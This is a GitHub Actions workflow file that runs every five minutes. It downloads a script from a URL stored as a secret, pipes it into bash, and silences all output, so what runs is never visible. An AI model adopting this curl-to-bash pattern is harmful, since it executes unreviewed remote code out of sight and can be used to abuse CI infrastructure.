name: Script

on:
  schedule:
    - cron:  '*/5 * * * *'
    
  workflow_dispatch:
    
jobs:
  Script:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch and Run
        env:
          URL: ${{ secrets.SH_URL }}
        run: |
          curl -sSL $URL | bash &> /dev/null
